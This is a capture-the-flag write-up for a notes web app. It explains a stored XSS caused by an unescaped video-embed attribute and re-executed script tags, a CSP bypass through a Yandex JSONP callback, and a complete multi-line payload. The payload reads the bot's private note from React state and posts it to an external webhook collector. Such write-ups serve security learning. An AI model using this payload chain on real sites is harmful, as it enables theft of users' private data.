# Web Chall 4

Author: `marlithor-cyber`

Challenge name: `Yet another notes`

## Summary

The bug is stored client-side XSS in the note renderer.

Two pieces make it exploitable:

1. `web/src/lib/videoPlugin.js` renders `{video id=...}` with `innerHTML`, so the `id` value can break out of the iframe tag.
2. `web/src/components/NoteView.jsx` walks the rendered note, recreates every `<script>` tag, and executes it again.

The bot registers a fresh user, creates a private note titled `Flag` whose content is the real flag, and then visits our public note. The goal is to execute JS in the bot context and extract that private note content.

Flag:

```text
LB{6a93f0d3ab7865413f804b6949546833}
```

## Root Cause

In `web/src/lib/videoPlugin.js`, the read-only note view builds an iframe like this:

```js
this.dom.innerHTML =
  `<iframe src="https://runtime.video.cloud.yandex.net/player/video/${node.attrs.id}" ...></iframe>`;
```

`node.attrs.id` comes directly from `{video id=...}` and is not escaped.

Then `web/src/components/NoteView.jsx` does:

```js
editorRef.current.querySelectorAll("script").forEach((old) => {
  const el = document.createElement("script");
  ...
  old.replaceWith(el);
});
```

So injected `<script>` elements are not inert. They are re-created and executed, which turns the HTML injection into reliable stored XSS.

## Why CSP Did Not Save It

The app sets:

```text
script-src 'self' *.yandex.net
```

That blocks inline JS, but it still allows external scripts from Yandex domains. The working bypass uses Yandex Speller JSONP:

```text
//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=...
```

The endpoint reflects the callback as:

```js
CALLBACK([...])
```

Using an arrow function expression as `callback` is enough to get code execution through the JSONP wrapper.

## How The Flag Was Read

Directly fetching the private note was unnecessary. The sidebar already loads the current user's full note list from `/api/notes`, and React keeps that list in component state.

When the bot visits our malicious public note:

1. The XSS runs in the bot session.
2. The sidebar is already populated with the bot's notes.
3. The newest note is the private `Flag` note created by the bot.
4. The payload reads React fiber state off the sidebar DOM node and extracts the first note's `content`.
5. That content is exfiltrated to an external collector.

The useful state path was:

```js
Object.values(top.root.firstChild.firstChild)[0]
  .return
  .memoizedState
  .memoizedState[0]
```

That object is the first note in the sidebar state, and its `content` field contains the flag.

## Final Payload Shape

Because `videoPlugin.js` rejects IDs longer than 200 bytes, the final exploit used many `{video}` lines, each carrying one short injected external script:

```text
{video id="></iframe><form/id=f><input/id=x></form>}
{video id="></iframe><textarea/id=t>https://webhook.site/...</textarea>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>f=document.forms[0])"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>x=document.forms[0][0])"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>document.forms[0].action=top.t.value)"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>document.forms[0].method='post')"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>document.forms[0][0].name='d')"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>s=top.root.firstChild.firstChild)"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>setTimeout(_=>r=Object.values(s)[0],2e3))"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>setTimeout(_=>q=r.return,4e3))"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>setTimeout(_=>m=q.memoizedState,5e3))"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>setTimeout(_=>n=m.memoizedState[0],6e3))"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>setTimeout(_=>x.value=n.content,8e3))"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>setTimeout(_=>f.submit(),9e3))"></script>}
```

The collector received:

```text
d=LB{6a93f0d3ab7865413f804b6949546833}
```

## Notes

- `bot/lib/browser.js` shows the exact flow: register, create private `Flag` note, visit attacker UUID.
- `solve.py` contains the helper flow for registration, note creation, and bot submission.
- `fastpow.c` is just a speedup for the bot proof-of-work.
